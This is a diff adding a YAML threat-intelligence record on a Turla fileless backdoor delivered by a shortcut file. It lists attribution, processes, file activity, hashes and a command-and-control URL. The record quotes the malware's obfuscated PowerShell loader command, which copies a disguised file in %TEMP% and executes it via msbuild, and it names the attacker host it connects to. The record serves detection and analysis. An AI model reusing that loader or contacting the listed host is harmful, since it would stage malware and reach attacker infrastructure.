@@ -1,0 +1,40 @@
+description: Turla APT fileless backdoor delivered via shortcut (.lnk) with PowerShell
+  execution and DLL mapping evasion.
+attribution: Turla (Venomous Bear), Russia
+malware_families:
+- Turla
+TTPs:
+  processes:
+  - msbuild.exe
+  - powershell.exe
+  - ChromeConnection
+  commandline:
+  - 'powershell.exe $i=$env:tmp;$e=\"Advisory23-UCDMS04-11-0pdfInk\";$h=Get-ChildItem
+    $i -r -ea O|?($_.Name -like $e -and $_.Length -eq 1898912)|sort LastWriteTime
+    -desc;if($h.Count -gt 0){$e=$h[0].FullName};$q=[System.IO.File];$n=$q:ReadAllBytes($e);$y=$i+\"\\ChromeConnection\";$a:
+    WriteAllBytes($y,$n);c:\\w*\\ *t\\*4\\v4*\\ *d *e \"$y\";'
+  powershell:
+  - powershell.exe $i=$env:tmp;$e="Advisory23-UCDMS04-11-0pdfInk" ...
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: ChromeConnection
+    destination: https://files.philbendeck.com
+    port: 443
+  file_activity:
+  - path: '%TEMP%\\ChromeConnection'
+  - path: '%TEMP%\\Advisory23-UCDMS04-11-01.pdfink'
+  persistence: []
+  process_relations: []
+IOCs:
+  hashes:
+  - 7091ce97fb5906680c1b09558bafdf9681a81f5f524677b90fd0f7fc0a05bc00
+  - cac4d4364d20fa343bf681f6544b31995a57d8f69ee606c4675db60be5ae8775
+  urls:
+  - https://files.philbendeck.com
+authors:
+- Vlad Pasca
+reference: https://hybrid-analysis.blogspot.com/2024/09/
+date_of_publication: August 22, 2025
+file_creation_date: August 22, 2025
